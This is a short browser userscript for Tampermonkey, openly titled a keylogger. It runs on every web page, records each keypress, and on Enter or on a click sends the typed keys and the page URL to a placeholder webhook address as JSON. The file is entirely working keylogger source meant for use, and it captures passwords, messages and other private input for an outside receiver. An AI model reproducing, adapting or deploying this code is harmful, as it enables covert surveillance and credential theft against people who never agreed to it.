// ==UserScript==
// @name Keylogger
// @namespace https://lyzev.github.io
// @version 1.0
// @description A simple keylogger for Tampermonkey. (Browser Extension)
// @author Lyzev
// @include http://*
// @include https://*
// @run-at document-start
// @grant none
// ==/UserScript==

(function() {
    const webhook = 'WEBHOOK-URL'
    let data = []

    window.addEventListener('keypress', e => {
        data.push(e.key)
        if (e.key === 'Enter' && data.length !== 0) {
            send('**URL**: `' + document.URL.substring(0, Math.max(document.URL.length, 20)) + '`\n' + JSON.stringify(data.slice(data.length - Math.max(data.length, 250))))
            data = []
        }
    })

    window.addEventListener('click', e => {
        if (data.length === 0) return
        send('**URL**: `' + document.URL.substring(0, Math.max(document.URL.length, 20)) + '`\n' + JSON.stringify(data.slice(data.length - Math.max(data.length, 250))))
        data = []
    })

    function send(text) {
        const request = new XMLHttpRequest()
        request.open('POST', webhook)
        request.setRequestHeader('Content-type', 'application/json')
        const params = {
            username: 'Keylogger',
            content: text
        }
        request.send(JSON.stringify(params))
    }
})();
